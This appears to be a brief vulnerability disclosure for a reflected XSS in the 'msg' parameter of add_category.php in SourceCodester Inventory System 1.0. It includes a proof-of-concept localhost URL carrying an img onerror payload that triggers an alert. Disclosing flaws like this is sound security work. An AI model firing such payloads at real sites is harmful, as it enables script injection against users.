# Reflected XSS in Inventory System (Add Category)
...
* **Version**: 1.0
* **Component**: Add Category (`add_category.php`)
* **Vulnerable Parameter**: `msg` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `add_category.php` file.
...
```
http://127.0.0.1:8089/add_category.php?msg=%3Cimg%20src=%22x%22%20onerror=%22alert(808774)%22%3E
...
<img width="980" height="680" alt="图片" src="https://github.com/user-attachments/assets/668977aa-f092-4f97-a098-b0febfb68c03" />
